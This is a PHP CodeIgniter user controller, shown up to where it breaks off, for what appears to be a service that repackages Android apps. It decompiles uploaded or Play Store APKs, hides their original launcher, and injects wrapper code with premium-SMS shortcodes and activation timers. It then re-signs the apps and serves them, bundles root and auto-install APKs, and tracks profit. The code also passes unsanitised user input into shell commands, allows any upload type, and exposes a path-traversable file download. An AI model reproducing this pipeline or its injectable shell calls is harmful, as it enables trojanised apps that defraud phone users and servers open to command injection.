<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);
if (!defined('BASEPATH'))
    exit('No direct script access allowed');
session_start();

class user extends CI_Controller {

    function __construct() {
        parent::__construct();
        $this->load->library('session');
        $this->load->helper('url');
        $this->load->library('upload');
        $this->load->library('pagination');
        $this->load->library('parser');
        $this->load->helper('cookie');
        $this->upload->set_allowed_types('*');
        $this->load->helper(array('form', 'url'));
        @session_start();
    }

    public function index() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            redirect('user/dashboard');
        }
    }

    public function dashboard() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {

            $this->load->model('notify_model');
            $this->load->model('report_model');
            $data['notifies'] = $this->notify_model->get_last();
            $data['userid'] = $this->session->userdata('userid');
            $data['username'] = $this->session->userdata('username');

            if (isset($_REQUEST['submit'])) {
                $month = $this->input->post('month', true);
                $year = $this->input->post('year', true) ? $this->input->post('year', true) : date('Y');

                $data['mon'] = $month;
                $data['y'] = $year;

                if ($month <> null) {
                    $num_days = cal_days_in_month(CAL_GREGORIAN, $month, $year);
                    $month = str_pad($month, 2, 0, STR_PAD_LEFT);
                    foreach (range(1, $num_days) as $day) {
                        $day = str_pad($day, 2, 0, STR_PAD_LEFT);
                        $data['month'][$day] = $this->report_model->total_profit_by_month($data['userid'], null, $day, $month, $year);
                    }
                    $this->load->view('user/dashboard', $data);
                } else {
                    redirect('user/dashboard');
                }
            } else {
                $year = date('Y');
                foreach (range(1, 12) as $n) {
                    $n = str_pad($n, 2, 0, STR_PAD_LEFT);
                    $data['month'][$n] = $this->report_model->total_profit_by_year($data['userid'], null, $n, $year);
                }
                $this->load->view('user/dashboard', $data);
            }
        }
    }

    public function register($error = null) {
        if ($this->session->userdata('userid') <> null) {
            redirect('user/dashboard');
        } else {
            if (isset($_REQUEST['registersmb'])) {
                /** Validate captcha */
                $capcha = $this->input->post('captcha', true);
                if (!empty($capcha)) {
                    if (empty($_SESSION['captcha']) || trim(strtolower($capcha)) != $_SESSION['captcha']) {
                        $captcha_message = "Invalid captcha";
                        $style = "background-color: #FF606C";
                    } else {
                        $name = $this->input->post('usernamesignup', true);
                        $phone = $this->input->post('phonesignup', true);
                        $pass = $this->input->post('passwordsignup', true);
                        $pass2 = $this->input->post('passwordsignup_confirm', true);
                        $fullname = $this->input->post('memberfullname', true);
                        $address = $this->input->post('memberaddress', true);
                        $email = $this->input->post('memberemail', true);

                        if ($pass <> $pass2) {
                            redirect('user/register/pass');
                        } else {
                            $this->load->model('user_model');
                            $result = $this->user_model->_adduser($name, $pass, $phone, $fullname, $address, $email);

                            $object[] = null;
                            $object['userid'] = $this->user_model->get_user_id($name);
                            $object['wap_name'] = $name;
                            $object['wap_title'] = $name;
                            $object['wap_meta_des'] = $name;
                            $object['wap_meta_content'] = $name;
                            $object['wap_copyright'] = $name;
                            $object['wap_active'] = 1;
                            $this->load->model('wap_model');
                            $this->wap_model->add_wap($object);

                            if ($result == 1) {
                                redirect('user/login/');
                            } else {
                                redirect('user/register/exit');
                            }
                        }
                    }

                    $request_captcha = htmlspecialchars($_REQUEST['captcha']);
                    unset($_SESSION['captcha']);
                }
            }
            if ($error == "pass") {
                $data['error'] = "Mật khẩu chưa trùng khớp";
            } elseif ($error == "exit") {
                $data['error'] = "Tài khoản đã tồn tại";
            } else {
                $data['error'] = "";
            }

            $this->load->view('user/register', $data);
        }
    }

    public function login($error = null) {
        if ($this->session->userdata('userid') <> null) {
            redirect('user/dashboard');
        } else {
            if (isset($_REQUEST['loginsmb'])) {
                $username = $this->input->post('uname', true);
                $pass1 = $this->input->post('pass1', true);
                $this->load->model('user_model');
                $result = $this->user_model->check_login_customer($username, $pass1);

                if ($result == null) {
                    redirect('user/login/' . rand(1, 10));
                } else {
                    $newdata = array(
                        'userid' => $result,
                        'username' => $username
                    );
                    $this->session->set_userdata($newdata);
                    redirect('user/yourapp');
                }
            }
            if ($error <> null) {
                $data['error'] = "Mật khẩu hoặc tên đăng nhập không đúng";
            } else {
                $data['error'] = "";
            }
            $this->load->view('user/login', $data);
        }
    }

    public function logout() {
        $this->session->unset_userdata('userid');
        $this->session->unset_userdata('username');
        redirect('home');
    }

    public function app() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('app_model');
            $userid = $this->session->userdata('userid');
            $config['base_url'] = site_url('user/app');
            $config['total_rows'] = $this->app_model->count_app_user($userid);
            $config['per_page'] = 10;
            $config['prev_link'] = 'Last';
            $config['next_link'] = 'Next';
            $this->pagination->initialize($config);
            $data['pages'] = $this->pagination->create_links();
            $data['apps'] = $this->app_model->list_app_user($userid, $config['per_page'], $this->uri->segment(3));
            $this->load->view('user/dashboard', $data);
        }
    }

    public function googleplay($file = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['output'] = null;
            $data['username'] = $this->session->userdata('username');
            $userid = $this->session->userdata('userid');
            $data['ok'] = null;
            if (isset($_REQUEST['submit'])) {
                $link = $this->input->post('ifile', true);
                $applink = $this->input->post('applink', true);
                $active = $this->input->post('active', true);
                $shortcode = $this->input->post('shortcode', true);
                $message = $this->input->post('message', true);
                $timeactive = $this->input->post('timeactive', true);
                $userid = $this->session->userdata('userid');
                $timeactive = $this->input->post('timeactive', true);
                $apptype = $this->input->post('apptype', true);
                $appdes = $this->input->post('appdes', true);
                $appcate = $this->input->post('cateapp', true);

                $obj = json_decode(file_get_contents(DOWNLOAD_STORE . 'getDetails/?app=' . $link . '&start=0'));

                if (gettype($obj) === 'object') {
                    redirect('user/googleplay/404');
                } else {
                    $obj = json_decode(file_get_contents(PLAYSTORE . 'v1.1/apps/' . $link . '?key=f3c7b5c3e71f194975b902efc2798ee8'));
                    //echo "<pre>";
                    //echo $obj->additionalInfo[0]->datePublished; 
                    //echo  die();
                    //echo $obj->additionalInfo[0]->datePublished; 
                    //echo $obj->additionalInfo[1]->fileSize;  
                    $developer = $obj->developer;
                    $thumbnails = $obj->thumbnails[0] . '@0@' . $obj->thumbnails[1] . '@0@' . $obj->thumbnails[2];
                    $score = $obj->score;
                    $datePublished = $obj->additionalInfo[0]->datePublished;
                    $filesize = $obj->additionalInfo[1]->fileSize;
                    $appname = str_replace("Android Apps on Google Play", "", $obj->appName);
                    $appname = str_replace("-", "", $appname);
                    $appdes = $obj->description;
                    $iconfile = $obj->logo;

                    $output = shell_exec('wget -O ' . LINK_URL . 'app/' . $userid . '/' . trim($link) . '.apk  ' . DOWNLOAD_STORE . 'store/apps/details?id=' . $link);
                    $data['output'] = "<pre>$output</pre>";

                    $object_file = $this->makefile_google($userid, $link . '.apk', $timeactive, $message, $shortcode);
                    $this->load->model('app_model');
                    $result = $this->app_model->add_app($userid, $appcate, $iconfile, $appname, $object_file['link'], $appdes, $active, $shortcode, SHORTCODE. " "  . $userid . " GA " . $appname, $timeactive, $apptype, $developer, $thumbnails, $score, $datePublished, $filesize);
                    if ($result == 1) {
                        redirect('user/app');
                    }
                }
            }

            if ($file == "404") {
                $data['error'] = "Hệ thống quá tải, không thể lấy file về.";
            } else {
                $data['error'] = "";
            }

            $this->load->model('shortcode_model');
            $this->load->model('cate_model');
            $data['listcateapps'] = $this->cate_model->list_cate_app();
            $data['shortcodes'] = $this->shortcode_model->list_shortcode();
            $data['userid'] = $this->session->userdata('userid');
            $this->load->view('user/dashboard', $data);
        }
    }

    public function add_default_file($user_folder) {

        if (!file_exists($user_folder . '/apktool')) {
            copy(LINK_URL . "apktool/apktool", $user_folder . '/apktool');
        }

        if (!file_exists($user_folder . '/apktool.jar')) {
            copy(LINK_URL . "apktool/apktool.jar", $user_folder . '/apktool.jar');
        }
        if (!file_exists($user_folder . '/certificate.pem')) {
            copy(LINK_URL . "apktool/certificate.pem", $user_folder . '/certificate.pem');
        }

        if (!file_exists($user_folder . '/signapk.jar')) {
            copy(LINK_URL . "apktool/signapk.jar", $user_folder . '/signapk.jar');
        }
        if (!file_exists($user_folder . '/key.pk8')) {
            copy(LINK_URL . "apktool/key.pk8", $user_folder . '/key.pk8');
        }
        if (!file_exists($user_folder . '/RootNow.apk')) {
            copy(LINK_URL . "app/RootNow.apk", $user_folder . '/RootNow.apk');
        }
    }

    public function makefile_google($userid, $ifile, $timeactive, $message, $shortcode) {
        $user_folder = './app/' . $userid;
        if (is_dir($user_folder) === false) {
            $old = umask(0);
            mkdir($user_folder, 0777, true);
            umask($old);
            $mypath = $user_folder;
        } else {
            $mypath = base_url('app/' . $userid);
        }

        $folder_file = trim(str_replace('.', '', $ifile));
        //----------------------------------

        $this->add_default_file($user_folder);



        $AppRoot = $this->config->item('approot');
        if (!file_exists($user_folder . '/' . $AppRoot)) {
            copy("LINK_URL.app/" . $AppRoot, $user_folder . '/' . $AppRoot);
        }

        $user_location = LINK_URL . 'app/' . $userid;

        //Giai ma file apk
        exec('java -jar ' . $user_location . '/apktool.jar d -f  ' . $user_location . '/' . $ifile . '  ' . $user_location . '/' . $folder_file);

        $activity_launcher = shell_exec('bash ' . LINK_URL . 'app/get_name.sh  ' . $user_location . '/' . $folder_file . '/AndroidManifest.xml');

        //Xu ly file AndroidManifest.xml
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'android.intent.category.LAUNCHER', "android.intent.category.DEFAULT");
        exec('cp -r ' . LINK_URL . 'app/system  ' . $user_location . '/' . $folder_file . '/smali');

        $name = $this->readApkInfoFromFile($user_location . '/' . $ifile);


        $position = strpos($activity_launcher, $name['sys_name']);
        if ($position === false) {
            $activity_launcher = $name['sys_name'] . $activity_launcher;
        }


        exec('bash ' . LINK_URL . 'app/wrapper.sh ' . $user_location . '/' . $folder_file . '/AndroidManifest.xml');
        //	exec('cp -R /home/tiendx/public_html/app/com/*  /home/tiendx/public_html/app/'.$userid.'/'.$folder_file.'/smali/com/');
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'Mtlink_url', site_url('app/' . $userid . '/' . $ifile));
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'GKD 15', SHORTCODE. " " . $userid . ' GA ' . $folder_file );
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', '60000', $timeactive);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', '6157', $shortcode);
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'AAAAAAAA', trim($activity_launcher));
        $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'BBBBBBB', $name['sys_name']);
        exec('java -jar ' . $user_location . '/apktool.jar b   ' . $user_location . '/' . $folder_file);



        //Generate application and sign it 
        $app_linux = $user_location . '/' . $folder_file . '/dist/' . $ifile;
        $singapk = $user_location . '/signapk.jar';
        $pem = $user_location . '/certificate.pem';
        $key = $user_location . '/key.pk8';
        $newapp_linux = $user_location . '/' . $folder_file . '/dist/' . 'signed_' . $ifile;

        //Xu ly tao file APK moi 
        exec('java -jar ' . $singapk . ' ' . $pem . ' ' . $key . ' ' . $app_linux . ' ' . $newapp_linux);
        unlink($user_location . '/' . $folder_file . '/dist/' . $ifile);
        exec('mv ' . './app/' . $userid . '/' . $folder_file . '/dist/' . $ifile . ' ' . './app/' . $userid . '/' . $folder_file . '/dist/' . $ifile);
        $link = site_url('/app/' . $userid . '/' . $folder_file . '/dist/' . 'signed_' . $ifile);

        $appicon = base_url('app/' . $userid . '/img/' . $name['iconname'] . '.png');
        $object['link'] = $link;
        $object['icon'] = $appicon;
        return $object;
    }

    public function add_app() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('app_model');
            if (isset($_REQUEST['submit'])) {

                $appname = $this->input->post('appname', true);
                $applink = $this->input->post('applink', true);
                $active = $this->input->post('active', true);
                $shortcode = $this->input->post('shortcode', true);
                $message = $this->input->post('message', true);
                $timeactive = $this->input->post('timeactive', true);
                $userid = $this->session->userdata('userid');
                $timeactive = $this->input->post('timeactive', true);
                $apptype = $this->input->post('apptype', true);
                $appdes = $this->input->post('appdes', true);
                $appcate = $this->input->post('cateapp', true);
				$popup_time = $this->input->post('popup_time',true);
                /*
                 * -------- Tao folder cho user
                 */

                if ($apptype == 1) {
                    $user_folder = './app/' . $userid;
                    if (is_dir($user_folder) === false) {
                        $old = umask(0);
                        mkdir($user_folder, 0777, true);
                        umask($old);
                        $mypath = $user_folder;
                    } else {
                        $mypath = base_url('app/' . $userid);
                    }



                    $ifile = $this->do_upload_file('./app/' . $userid, 'ifile');
					 
                    $folder_file = trim(str_replace('.', '', $ifile));
                    $app_id_name = preg_replace('/[^A-Za-z0-9\. -]/', '', $folder_file);

                    //----------------------------------


                    $this->add_default_file($user_folder);
                    // 
                    // 
                    // $AppRoot = $this->config->item('approot');
                    // if (!file_exists($user_folder . '/' . $AppRoot)) {
                    //     copy("app/" . $AppRoot, $user_folder . '/' . $AppRoot);
                    // }

                    $user_location = LINK_URL . 'app/' . $userid;

                    // Bước 1 
                    //Giai ma file apk
                    exec('java -jar ' . $user_location . '/apktool.jar d -f  ' . $user_location . '/' . $ifile . '  ' . $user_location . '/' . $folder_file);
					
                    // Bước 2
                    // lấy activity launcher chính của app chính 
                    $activity_launcher = shell_exec('bash ' . LINK_URL . 'app/get_name.sh  ' . $user_location . '/' . $folder_file . '/AndroidManifest.xml');

                    // Bước 3
                    //Xu ly file AndroidManifest.xml
                    $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'android.intent.category.LAUNCHER', "android.intent.category.DEFAULT");

                    // Bước 4
                    exec('cp -r ' . LINK_URL . 'app/system  ' . $user_location . '/' . $folder_file . '/smali');
					exec('cp ' . LINK_URL . 'app/dialog_custom.xml  ' . $user_location . '/' . $folder_file . '/res/layout/');
                    // Bước 5
                    //Nhét Activity mới vào 
                    exec('bash ' . LINK_URL . '/app/wrapper.sh ' . $user_location . '/' . $folder_file . '/AndroidManifest.xml');

                    //------ Bắt đầu quá trình xử lý file apk & AndroidManifest
                    $name = $this->readApkInfoFromFile($user_location . '/' . $ifile);
                    $appname = $name['lable'];
						
                    $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'Mtlink_url', site_url('app/' . $userid . '/' . $ifile));
                    $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'GKD 15', SHORTCODE .' '. $userid . ' APP ' . $app_id_name);
                    $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', '60000', $timeactive);
                    $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', '6157', $shortcode);
                    $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'AAAAA', trim($activity_launcher));
                    $this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'BBBBB', $name['sys_name']);
					$this->update_stringfile($user_location . '/' . $folder_file . '/AndroidManifest.xml', 'EEEEE', $popup_time);
					 
                    exec('java -jar ' . $user_location . '/apktool.jar b   ' . $user_location . '/' . $folder_file);
					
                    //Generate application and sign it 
                    $app_linux = $user_location . '/' . $folder_file . '/dist/' . $ifile;
                    $singapk = $user_location . '/signapk.jar';
                    $pem = $user_location . '/certificate.pem';
                    $key = $user_location . '/key.pk8';
                    $newapp_linux = $user_location . '/' . $folder_file . '/dist/' . 'signed_' . $ifile;
						
                    //Xu ly tao file APK moi 
					
					exec('java -jar ' . $singapk . ' ' . $pem . ' ' . $key . ' ' . $app_linux . ' ' . $newapp_linux);
					 
                    unlink($user_location . '/' . $folder_file . '/dist/' . $ifile);
					
                    exec('mv ' . $user_location . '/' . $folder_file . '/dist/' . 'signed_' . $ifile . '  ' . $user_location . '/m_' . $ifile);
                    $link = site_url('/app/' . $userid . '/m_' . $ifile);
                    $applink = $link;

                    //Xoá thư mục tạo app 
                   	//shell_exec('rm -rf ' . $user_location . '/' . $folder_file . ' ' . $user_location . '/' . $ifile);
                }

                if ($apptype === 2) {
                    $applink = site_url('app/' . $userid . '/' . $ifile);
                }

                if ($apptype === 3) {
                    $applink = site_url('app/' . $userid . '/' . $ifile);
                }
                //$apptype = 1: android;
                //$apptype = 2: ios;
                //$apptype = 3: java;

                $appicon = base_url('app/' . $userid . '/img/' . $name['iconname'] . '.png');
                $result = $this->app_model->add_app($userid, $appcate, $appicon, $appname . '_' . date('s'), $applink, $appdes, $active, $shortcode, "GKD " . $userid . " " . $message, $message, $apptype);
                if ($result == 1) {
                    redirect('user/app');
                }
            }
            $this->load->model('shortcode_model');
            $this->load->model('cate_model');
            $data['listcateapps'] = $this->cate_model->list_cate_app();
            $data['shortcodes'] = $this->shortcode_model->list_shortcode();
            $data['userid'] = $this->session->userdata('userid');
            $this->load->view('user/dashboard', $data);
        }
    }

    public function downloadfile($link_apk_file) {
        header('Content-Type: application/vnd.android.package-archive');
        header('Content-Disposition: attachment; filename="' . $link_apk_file . '"');
        readfile($link_apk_file);
    }

    /*
     * Cac ham xu ly file APK
     */

    public function readApkInfoFromFile($apk_file, $get_icon = true) {
        $icon_app = basename($apk_file);
        $apk_dir = dirname($apk_file);
        $aapt = '/usr/bin/aapt';
        $tmp_apk = "";
        if (substr($apk_file, 0, 7) == 'http://') {
            $tmp_apk = "/tmp/" . md5(microtime()) . ".apk";

            exec('/usr/bin/wget ' . $apk_file . ' -O ' . $tmp_apk . " -t 1", $_out, $_return);

            if (filesize($tmp_apk) > 0) {
                $apk_file = $tmp_apk;
            }
        }

        $info['filesize'] = filesize($tmp_apk);

        exec("{$aapt} d badging {$apk_file}", $out, $return);

        if ($return == 0) {
            $str_out = implode("\n", $out);
            $out = null;

            #icon
            if ($get_icon) {
                $pattern_icon = "/icon='(.+)'/isU";
                preg_match($pattern_icon, $str_out, $m);
                $info['icon'] = $m[1];
                if ($info['icon']) {

                    $icon_dir = $apk_dir . "/img";
                    if (!is_dir($icon_dir)) {
                        $old = umask(0);
                        mkdir($icon_dir, 0755);
                        umask($old);
                    }

                    $icon_tmp = "/tmp/" . $icon_app;
                    $old = umask(0);
                    if (is_dir($icon_tmp)) {
                        
                    } else {
                        mkdir($icon_tmp, 0755, true);
                    }
                    umask($old);

                    if ($tmp_apk) {
                        $command = "unzip {$tmp_apk} -d {$icon_tmp}";
                    } else {
                        $command = "unzip {$apk_file} -d {$icon_tmp}";
                    }

                    exec($command);

                    $icon_file_tmp = $icon_tmp . "/" . $info['icon'];
                    $img_icon = preg_replace('/\s+/', '', $icon_app);
                    $icon_file_dst = $icon_dir . "/" . $img_icon . ".png";
                    $cp_icon = "cp {$icon_file_tmp} {$icon_file_dst}";
                    exec($cp_icon);
                }
            }

            $info['iconname'] = $img_icon;



            $pattern_name = "/application: label='(.*)'/isU";
            preg_match($pattern_name, $str_out, $m);
            $info['lable'] = $m[1];


            $pattern_sys_name = "/package: name='(.*)'/isU";
            preg_match($pattern_sys_name, $str_out, $m);
            $info['sys_name'] = $m[1];


            $pattern_version_code = "/versionCode='(.*)'/isU";
            preg_match($pattern_version_code, $str_out, $m);
            $info['version_code'] = $m[1];


            $pattern_version = "/versionName='(.*)'/isU";
            preg_match($pattern_version, $str_out, $m);
            $info['version'] = $m[1];

            $pattern_launch = "/activity name='(.*)'/isU";
            preg_match($pattern_version, $str_out, $m);
            $info['launch'] = $m[1];


            #He thong cua file apk
            // $pattern_sdk = "/sdkVersion:'(.*)'/isU";
 //            preg_match($pattern_sdk, $str_out, $m);
 //            $info['sdk_version'] = $m[1];
 //            if ($info['sdk_version']) {
 //                $sdk_names = array(3 => "1.5", 4 => "1.6", 7 => "2.1", 8 => "2.2", 10 => '2.3.3', 11 => "3.0", 12 => "3.1", 13 => "3.2", 14 => "4.0");
 //                if ($sdk_names[$info['sdk_version']]) {
 //                    $info['os_req'] = "Android {$sdk_names[$info['sdk_version']]}";
 //                }
 //            }

            $info['apk_info'] = $str_out;

            if ($tmp_apk) {
                unlink($tmp_apk);
            }

            return $info;
        }

        if ($tmp_apk) {
            unlink($tmp_apk);
        }
    }

    function mkdirs($path, $lastoneisfile = false, $rights = 0777) {
        if (trim($path) == '')
            return;
        if (!$lastoneisfile && substr($path, - 1) != '/') {
            $path = $path . "/";
        }
        if (is_dir($path)) {
            return true;
        } //found it!
        $path = str_replace("\\", "/", $path);
        $path = preg_replace('/\/+/i', '/', $path);
        $pathes = explode('/', $path);
        $cnt = count($pathes) - 1;
        $dir = current($pathes) . "/";
        if (!is_dir($dir . "/")) {
            mkdir($dir);
        }
        for ($i = 0; $i < $cnt; $i++) {
            if (!is_dir($dir . "/")) {
                @mkdir($dir);
                @chmod($dir, $rights);
            }
            $dir .= next($pathes) . "/";
        }
    }

    /*
     * Ket thuc Cac ham xu ly file APK
     */

    public function update_stringfile($filename, $old, $new) {
        $str = file_get_contents($filename);

        $str = str_replace($old, $new, $str);

        file_put_contents($filename, $str);
    }

    public function update_app($id = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('app_model');
            $userid = $this->session->userdata('userid');
            if (isset($_REQUEST['submit'])) {
                $appname = $this->input->post('appname', true);
                $applink = $this->input->post('applink', true);
                $active = $this->input->post('active', true);
                $shortcode = $this->input->post('shortcode', true);
                $message = $this->input->post('message', true);
                $timeactive = $this->input->post('timeactive', true);
                $userid = $this->session->userdata('userid');
                $timeactive = $this->input->post('timeactive', true);
                $apptype = $this->input->post('apptype', true);
                $appdes = $this->input->post('appdes', true);
                /*
                 * -------- Tao folder cho user
                 */

                if ($apptype == 1) {
                    $user_folder = './app/' . $userid;
                    if (is_dir($user_folder) === false) {
                        mkdir($user_folder, 0777, true);
                        $mypath = $user_folder;
                    } else {
                        $mypath = base_url('app/' . $userid);
                    }


                    $ifile = $this->do_upload_file('./app/' . $userid, 'ifile');
                    if (!isset($ifile)) {
                        
                    } else {

                        $folder_file = trim(str_replace('.', '', $ifile));
                        //----------------------------------
                        //chmod_r($user_folder.'/'.$ifile, 777,true);
                        if (!file_exists($user_folder . '/apktool')) {
                            copy(LINK_URL . "apktool/apktool", $user_folder . '/apktool');
                        }
                        if (!file_exists($user_folder . '/apktool.jar')) {
                            copy(LINK_URL . "apktool/apktool.jar", $user_folder . '/apktool.jar');
                        }
                        if (!file_exists($user_folder . '/certificate.pem')) {
                            copy(LINK_URL . "apktool/certificate.pem", $user_folder . '/certificate.pem');
                        }
                        if (!file_exists($user_folder . '/MTLab.apk')) {
                            copy(LINK_URL . "apktool/MTLab.apk", $user_folder . '/MTLab.apk');
                        }
                        if (!file_exists($user_folder . '/AutoInstall.apk')) {
                            copy(LINK_URL . "app/AutoInstall.apk", $user_folder . '/AutoInstall.apk');
                        }
                        exec('java -jar ' . LINK_URL . 'app/' . $userid . '/apktool.jar d -f  ' . LINK_URL . 'app/' . $userid . '/AutoInstall.apk  ' . LINK_URL . 'app/' . $userid . '/' . $folder_file);
                        //	exec('cp -R /home/tiendx/public_html/app/com/*  /home/tiendx/public_html/app/'.$userid.'/'.$folder_file.'/smali/com/');
                        $name = $this->readApkInfoFromFile(LINK_URL . 'app/' . $userid . '/' . $ifile);
                        $appname = $name['lable'];

                        $this->update_stringfile(LINK_URL . 'app/' . $userid . '/' . $folder_file . '/AndroidManifest.xml', 'Mtlink_url', site_url('app/' . $userid . '/' . $ifile));
                        $this->update_stringfile(LINK_URL . 'app/' . $userid . '/' . $folder_file . '/AndroidManifest.xml', 'GKD 15', 'GKD ' . $userid . ' ' . $message . ' ' . rand(1, 9999));
                        $this->update_stringfile(LINK_URL . 'app/' . $userid . '/' . $folder_file . '/AndroidManifest.xml', '99999', $timeactive);
                        $this->update_stringfile(LINK_URL . 'app/' . $userid . '/' . $folder_file . '/AndroidManifest.xml', 'AAAAAAAA', $name['launch']);
                        $this->update_stringfile(LINK_URL . 'app/' . $userid . '/' . $folder_file . '/AndroidManifest.xml', 'BBBBBBB', $name['sys_name']);

                        exec('java -jar ' . LINK_URL . 'app/' . $userid . '/apktool.jar b   ' . LINK_URL . 'app/' . $userid . '/' . $folder_file);


                        //	$appicon = $name['icon']);
                        $link = site_url('/app/' . $userid . '/' . $folder_file . '/dist/AutoInstall.apk');
                        $applink = $link;
                    }
                }

                if ($apptype == 2) {
                    $applink = site_url('app/' . $userid . '/' . $ifile);
                }

                if ($apptype == 3) {
                    $applink = site_url('app/' . $userid . '/' . $ifile);
                }
                //$apptype = 1: android;
                //$apptype = 2: ios;
                //$apptype = 3: java;
                $appicon = base_url('app/' . $userid . '/img/' . $appname . '.png');

                $result = $this->app_model->add_app($userid, $appicon, $appname . '_' . date('y-d-m-h-m-s'), $applink, $appdes, $active, $shortcode, SHORTCODE. " " . $userid . " " . $message, $timeactive, $apptype);
                if ($result == 1) {
                    redirect('user/app');
                }
            }
            $this->load->model('shortcode_model');
            $data['shortcodes'] = $this->shortcode_model->list_shortcode();
            $data['apps'] = $this->app_model->get_app($userid, $id);
            $this->load->view('user/dashboard', $data);
        }
    }

    public function del_app($id = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('app_model');
            $userid = $this->session->userdata('userid');
            $app_link = $this->app_model->return_app_name($userid, $id);
            $tmp = explode('/', $app_link);
            $app_file_signed = end($tmp);
            list($null, $app_file) = explode('_', $app_file_signed, 2);
            shell_exec('rm -rf ' . LINK_URL . 'app/' . $userid . '/m_' . $app_file);
            $this->app_model->del_app($userid, $id);
            redirect('user/app');
        }
    }

    public function gallery() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $userid = $this->session->userdata('userid');
            if (!file_exists('./src/' . $userid)) {
                mkdir('./src/' . $userid, 0777, true);
            }
            $data['username'] = $this->session->userdata('username');
            $this->load->model('app_model');
            if (isset($_FILES['upload']['name'])) {
                $select_type = $this->input->post('select_type', true);
                // total files //
                $count = count($_FILES['upload']['name']);
                // all uploads //
                $uploads = $_FILES['upload'];
                $itemid = $this->input->post('itemid', true);

                for ($i = 0; $i < $count; $i++) {
                    if ($uploads['error'][$i] == 0) {
                        $name = str_replace('.jpg', '', $uploads['name'][$i]);
                        $name = $name . '_' . time() . '.jpg';
                        //echo LINK_URL.'/src/'.$userid.'/'.$name;die;
                        move_uploaded_file($uploads['tmp_name'][$i], './src/' . $userid . '/' . $name);
                        $this->app_model->add_image_for_item($userid, $itemid, $name, $select_type);
                    }
                }
            }

            if (isset($_REQUEST['submit_gallery'])) {
                $imagelink = $this->input->post('imagelink', true);
                $select_type = $this->input->post('select_type', true);
                $this->app_model->add_image_for_item($userid, null, $imagelink, $select_type);
                redirect('user/gallery');
            }
            $data['allgallery'] = $this->app_model->show_allgallery($userid);
            $data['allcontents'] = $this->app_model->list_app_user($userid);

            $config['base_url'] = site_url('user/gallery');
            $config['total_rows'] = $this->app_model->count_image_by_id($userid);
            $config['per_page'] = 12;
            $config['prev_link'] = 'Last';
            $config['next_link'] = 'Next';
            $this->pagination->initialize($config);
            $data['pages'] = $this->pagination->create_links();
            $data['images'] = $this->app_model->show_image_by_appid($userid, $config['per_page'], $this->uri->segment(3));
            $this->load->view('user/dashboard', $data);
        }
    }

    public function ajaximagegallery($id) {
        $this->load->model('app_model');
        $userid = $this->session->userdata('userid');
        $config['base_url'] = site_url('user/ajaximagegallery');
        $config['total_rows'] = $this->app_model->count_image_by_id($id);
        $config['per_page'] = 10;
        $config['prev_link'] = 'Last';
        $config['next_link'] = 'Next';
        $this->pagination->initialize($config);
        $data['pages'] = $this->pagination->create_links();
        $result = $this->app_model->show_image_by_appid($id, $config['per_page'], $this->uri->segment(3));
        if (!$result) {
            echo "Hiện tại app này chưa có ảnh đính kèm.";
        } else {
            echo '<ul class="ace-thumbnails">';
            foreach ($result as $img) {
                echo '<li style="display:inline-block;">';
                echo '<a href="' . $img->imageslink . '" > ';
                echo '<img alt="150x150" width="150" height="150" src="' . $img->imageslink . '" />';
                echo '</a>';
                echo '<div class="tools tools-bottom">';
                echo '<a href="' . site_url('user/del_image_gallery/' . $img->id) . '"> <i class="icon-remove red"></i> Xóa </a>';
                echo '</div>';
                echo '</li>';
            }
            echo '</ul>';
            echo $data['pages'];
        }
    }

    public function del_image_gallery($id) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $userid = $this->session->userdata('userid');
            $this->load->model('app_model');
            $this->app_model->del_image_gallery($id, $userid);
            redirect('user/gallery');
        }
    }

    public function content() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('content_model');
            if (isset($_REQUEST['submit'])) {
                $title = $this->input->post('content_title', true);
                $content = $this->input->post('content_content', true);
                $userid = $this->session->userdata('userid');
                $this->content_model->add_content($userid, $title, $content);
                redirect('user/content');
            }

            $data['contents'] = $this->content_model->show_all($this->session->userdata('userid'));
            $this->load->view('user/dashboard', $data);
        }
    }

    public function del_content($id) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('content_model');
            $userid = $this->session->userdata('userid');
            $this->content_model->del_content($userid, $id);
            redirect('user/content');
        }
    }

    public function vip() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('user_model');
            $userid = $this->session->userdata('userid');
            $data['your_id'] = $userid;
            if ($this->user_model->type($userid) <> 0) {
                $this->load->view('user/default', $data);
            } else {
                $this->load->view('user/dashboard');
            }
        }
    }

    /*
     * -------------------------------API------------------------------------
     */

    public function api() {
        if ($this->session->userdata('userid') == null) {
